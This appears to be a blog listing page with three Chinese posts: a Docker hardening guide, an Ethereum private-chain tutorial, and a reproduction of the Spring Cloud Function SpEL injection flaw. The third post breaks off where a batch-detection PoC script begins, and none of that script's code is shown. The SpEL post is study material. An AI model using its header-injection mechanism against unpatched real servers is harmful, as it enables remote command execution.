<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"hkirito.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.5.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Sanwu">
<meta property="og:url" content="http://hkirito.github.io/page/2/index.html">
<meta property="og:site_name" content="Sanwu">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Sanwu">
<meta property="article:tag" content="NetWork">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://hkirito.github.io/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Sanwu</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Sanwu</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Sanwu</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Hkirito" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hkirito" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



          </div>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2022/06/21/Docker%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E7%99%BD%E7%9A%AE%E4%B9%A6%E5%8F%8A%E5%AF%B9%E5%BA%94%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/21/Docker%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E7%99%BD%E7%9A%AE%E4%B9%A6%E5%8F%8A%E5%AF%B9%E5%BA%94%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">Docker容器安全最佳实践白皮书及对应修复方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-21 17:16:04" itemprop="dateCreated datePublished" datetime="2022-06-21T17:16:04+08:00">2022-06-21</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2024-03-29 14:57:56" itemprop="dateModified" datetime="2024-03-29T14:57:56+08:00">2024-03-29</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Network-Safety/" itemprop="url" rel="index"><span itemprop="name">Network-Safety</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>基于v1.3.6版本</p>
<h2 id="一、主机安全配置"><a href="#一、主机安全配置" class="headerlink" title="一、主机安全配置"></a>一、主机安全配置</h2><h3 id="1-1、Linux主机配置检测"><a href="#1-1、Linux主机配置检测" class="headerlink" title="1.1、Linux主机配置检测"></a>1.1、Linux主机配置检测</h3><h4 id="1-1-1、为容器创建一个单独的分区"><a href="#1-1-1、为容器创建一个单独的分区" class="headerlink" title="1.1.1、为容器创建一个单独的分区"></a>1.1.1、为容器创建一个单独的分区</h4><p>  默认情况下所有的容器存储在/var/lib/docker目录下，当其写满时，会造成Docker甚至主机无法使用，因此，建议为Docker创建新的分区。若已安装，建议使用LVM创建分区。</p>
<p>  修复：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">配置 docker data 数据挂载点，修改后重载守护进程以及重新docker服务。</span><br><span class="line">$ vim /etc/docker/daemon.json</span><br><span class="line"># 在json格式的 &#123;&#125; 中加入如下字段及内容。</span><br><span class="line"><span class="string">&quot;data-root&quot;</span>: <span class="string">&quot;/test/docker&quot;</span>,</span><br><span class="line">$ systemctl daemon-reload &amp;&amp; systemctl restart docker</span><br></pre></td></tr></table></figure>

<h4 id="1-1-2、确保只允许受信任的用户控制Docker守护进程"><a href="#1-1-2、确保只允许受信任的用户控制Docker守护进程" class="headerlink" title="1.1.2、确保只允许受信任的用户控制Docker守护进程"></a>1.1.2、确保只允许受信任的用户控制Docker守护进程</h4><p>  此项会列出所有有权限使用Docker的普通用户，请确保其是符合你的期望。若需要添加或删除，请使用以下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 docker 组中删除任何不受信任的用户</span></span><br><span class="line">sudo gpasswd -d &lt;your-user&gt; docker </span><br><span class="line"></span><br><span class="line"><span class="comment"># 将受信任的用户添加到 docker 组</span></span><br><span class="line">sudo usermod -aG docker &lt;your-user&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="1-1-3、确保为-Docker-守护程序配置审计"><a href="#1-1-3、确保为-Docker-守护程序配置审计" class="headerlink" title="1.1.3、确保为 Docker 守护程序配置审计"></a>1.1.3、确保为 Docker 守护程序配置审计</h4><p>  将Docker守护程序用audit工具审计</p>
<p>  修复：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在/etc/audit/rules.d/audit.rules文件中写入</span></span><br><span class="line">-w /usr/bin/dockerd -k Docker_daemon</span><br><span class="line"><span class="comment"># 然后auditctl -R /etc/audit/rules.d/audit.rules重载规则</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="1-1-4、确保为-Docker-文件和目录配置审计-run-containerd"><a href="#1-1-4、确保为-Docker-文件和目录配置审计-run-containerd" class="headerlink" title="1.1.4、确保为 Docker 文件和目录配置审计 -/run/containerd"></a>1.1.4、确保为 Docker 文件和目录配置审计 -/run/containerd</h4><p>  将容器文件及目录用audit工具审计</p>
<p>  修复：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在/etc/audit/rules.d/audit.rules文件中写入</span></span><br><span class="line">-w /run/containerd -k Docker_containerd</span><br><span class="line"><span class="comment"># 然后auditctl -R /etc/audit/rules.d/audit.rules重载规则</span></span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2022/05/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E9%83%A8%E7%BD%B2%E5%8F%8A%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E9%83%A8%E7%BD%B2%E5%8F%8A%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">区块链以太坊私有链部署及学习</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-08 18:19:22" itemprop="dateCreated datePublished" datetime="2022-05-08T18:19:22+08:00">2022-05-08</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-05-12 21:42:02" itemprop="dateModified" datetime="2022-05-12T21:42:02+08:00">2022-05-12</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Software/" itemprop="url" rel="index"><span itemprop="name">Software</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="区块链以太坊私有链部署及学习"><a href="#区块链以太坊私有链部署及学习" class="headerlink" title="区块链以太坊私有链部署及学习"></a>区块链以太坊私有链部署及学习</h1><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">区块链为去中心化的代表产物，近年来一直备受关注，想着首先从源头开始，学习自己搭建一个自己的私有链进行学习一下基本的逻辑及对象。</span><br><span class="line"></span><br><span class="line">区块：</span><br><span class="line">Block-由交易和数据组成的数据块，一般由矿工以各种竞争的方式进行打包（获取奖励）</span><br><span class="line"></span><br><span class="line">矿工：</span><br><span class="line">Miner-一般指链中的账户，每个账户都可以是矿工，进行挖矿打包工作来赚取打包费。</span><br><span class="line"></span><br><span class="line">交易：</span><br><span class="line">Trans-指账户间的交易，数据与数据的交易，数据与合约的交易，合约与合约的交易等，交易一般会收取汽油gas费。</span><br><span class="line"></span><br><span class="line">合约：</span><br><span class="line">Contract-这里一般指链上的一段固定代码，接受指定的数据经过逻辑做出对应的操作。</span><br><span class="line"></span><br><span class="line">其中矿工和合约均会以账户的形式存在与链上，与账户“交流”的方式就是知晓其地址，即address。</span><br></pre></td></tr></table></figure>

<p>搭建私有链从环境开始</p>
<p>本人搭建环境为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aliyun ubuntu 18.04</span><br><span class="line"></span><br><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository -y ppa:ethereum/ethereum</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ethereum</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">geth --help</span><br><span class="line">出现版本及参数提示时即为安装成功</span><br></pre></td></tr></table></figure>

<p>当然大家也可以选择从源代码中直接编译安装</p>
<p>接下来是创建私有链账户</p>
<p>先准备好一个文件夹，例如我这里为GethBlock</p>
<p>使用命令<code>geth —datadir GethBlock account new</code>然后输入密码两次创建一个账户，此时会返回给你一个address记住这个address，再重复创建另一个账户，记下address。</p>
<p><img src="/2022/05/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E9%83%A8%E7%BD%B2%E5%8F%8A%E5%AD%A6%E4%B9%A0/image_rAzTJBEFqz.png"></p>
<p>接下来就是创世区块文件编写开始，将创建的两个账户address插入到alloc内，balance为余额，设置余额的目的是为了在启动链时可以直接进行交易来让矿工挖出区块，避免因为余额不足导致无法挖出区块的问题。</p>
<p>genesis.json文件如下</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;chainId&quot;</span>: <span class="number">999</span>,</span><br><span class="line">        <span class="attr">&quot;homesteadBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip150Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip155Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;eip158Block&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;byzantiumBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;constantinopleBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;petersburgBlock&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;ethash&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;nonce&quot;</span>: <span class="string">&quot;0x0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;0x5ddf8f3e&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;extraData&quot;</span>: <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;gasLimit&quot;</span>: <span class="string">&quot;8000000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;difficulty&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;coinbase&quot;</span>: <span class="string">&quot;0xa0Fc8b3D878DEFAF76a3DaF003E8190b35c55eAA&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;alloc&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;a0Fc8b3D878DEFAF76a3DaF003E8190b35c55eAA&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;balance&quot;</span>:<span class="string">&quot;20000009800000000000000000000&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;CDf98f5e8319D0d4DCbA883a3294fe734e30f380&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;balance&quot;</span>:<span class="string">&quot;20000009800000000000000000000&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;number&quot;</span>: <span class="string">&quot;0x0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;gasUsed&quot;</span>: <span class="string">&quot;0x01&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="一些参数的解释"><a href="#一些参数的解释" class="headerlink" title="一些参数的解释"></a>一些参数的解释</h4><p><code>chainId</code>不建议设置为1，因为1是以太坊主链，若设置为1则后续挖掘区块会因为<code>diffculty</code>的数字过大而导致无法挖出区块来。</p>
<p><code>diffculty</code>的数字建议小一些，这样自己挖掘的难度也会小很多</p>
<p><code>coinbase</code>指启动链时默认的账户为这个地址。可以为0x0000000…000，启动后当你创建第一个账户后默认为第一个创建的账户。</p>
<p><code>balance</code>为余额，单位为ether</p>
<p><code>gaslimit</code>为gas的限制，gas会随着交易额等因素动态变化，此项可限制其额度。</p>
<h3 id="初始化私有链"><a href="#初始化私有链" class="headerlink" title="初始化私有链"></a>初始化私有链</h3><p>使用命令<code>geth --datadir GethBlock init genesis.json</code>来初始化私有链</p>
<p><img src="/2022/05/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E9%83%A8%E7%BD%B2%E5%8F%8A%E5%AD%A6%E4%B9%A0/image_GdxEmoezlE.png"></p>
<p>此时初始化成功，创建password文件，将两个账户的密码分两行写入文件中</p>
<p>启动链命令如下</p>
<p><code>geth --datadir GethBlock --networkid 999 --unlock &#39;0,1&#39; --password password.txt --nodiscover console 2&gt;&gt;geth.log</code></p>
<p>命令详解</p>
<p><code>—datadir</code>为指定的数据存放文件夹，<code>—networkid</code>为网络标识号 <code>—unlock</code>和<code>—password</code>为默认启动时解锁password.txt的第0行和第1行的账户（后面操作转账时不需再次验证解锁），<code>console</code>为进入命令行操作界面，<code>2&gt;&gt;geth.log</code>为将操作日志写入geth.log中</p>
<p>进入命令行后为</p>
<p><img src="/2022/05/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E9%83%A8%E7%BD%B2%E5%8F%8A%E5%AD%A6%E4%B9%A0/image_P_yQ6K0aGt.png"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eth.coinbase查看当前账户地址</span><br><span class="line">eth.accounts查看当前链账户列表</span><br><span class="line">eth.blockNumber查看当前区块数量</span><br><span class="line">eth.getBalance(<span class="string">&quot;&quot;</span>)获取账户的余额</span><br><span class="line">eth.sendTransaction(&#123;from:eth.accounts[<span class="number">1</span>],to:eth.accounts[<span class="number">2</span>],value:am&#125;)</span><br><span class="line">miner.start(<span class="number">1</span>)使用当前账户为矿工账户进行挖矿括号内为线程数</span><br><span class="line">am = web3.toWei(<span class="number">50</span>,&#x27;ether&#x27;)</span><br><span class="line">admin.addPeer()节点接入参数为admin节点的ennode信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先设定一个数值，然后直接发起交易（sendTransaction），然后进行挖矿（miner.start），等待进度条precent进行到100时即可成功挖出区块，此时提示（successfully）区块产生，交易已被打包，查看转账账户余额即可。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">Spring_SPEL漏洞学习复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-31 14:21:42" itemprop="dateCreated datePublished" datetime="2022-03-31T14:21:42+08:00">2022-03-31</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2024-04-09 14:57:54" itemprop="dateModified" datetime="2024-04-09T14:57:54+08:00">2024-04-09</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Network-Safety/" itemprop="url" rel="index"><span itemprop="name">Network-Safety</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Spring-Cloud-Function-SPEL漏洞"><a href="#Spring-Cloud-Function-SPEL漏洞" class="headerlink" title="Spring Cloud Function SPEL漏洞"></a>Spring Cloud Function SPEL漏洞</h1><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><h4 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h4><p>暂无</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Springboot中支持使用在header中直接指明调用对应函数的方式，但是在Spring的Routing-function中获取Header头时使用了功能强大但安全性不高的StandardEcalutionContext导致在处理时直接传入了SPEL进行了命令执行。</span><br><span class="line">在修复的版本中，已新增了headerEvalContext对象，该对象所对应的是使用了仅支持最基本功能的SimpleEvaluationContext。来避免了漏洞的发生</span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用idea的Spring项目构建一个基本项目</p>
<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_8qoniQsNvMyGiQHmxLAMj1.png" alt="流程1"></p>
<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_wnwtJxxbatRS76WcEnxrSY.png" alt="流程2"></p>
<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_8BVBexdvBv4ZweknC43f1f.png" alt="流程3"></p>
<p>等待项目初始化完毕后，编辑pom.xml文件</p>
<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_2EVoq229RwRA1kHhMuuXHW.png" alt="pom.xml"></p>
<p>将版本改为可受影响的版本，目前3.2.2版本已修复所以我这里尝试的3.2.1</p>
<p>然后直接运行项目即可，默认启动端口为8080</p>
<p>利用idea的http项目直接创建一个.http结尾的文件</p>
<p>然后在其中直接请求</p>
<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_6ob9EaLQ6bL5tqxh9Hencu.png" alt="复现"></p>
<p>点击执行即可触发漏洞</p>
<p><img src="/2022/03/31/Spring-SPEL%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%A4%8D%E7%8E%B0/image_96qXjx17TaVFGtnpxqhXif.png" alt="效果"></p>
<h3 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h3><p>批量检测Poc脚本-(简单通过返回码及返回内容判断影响)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 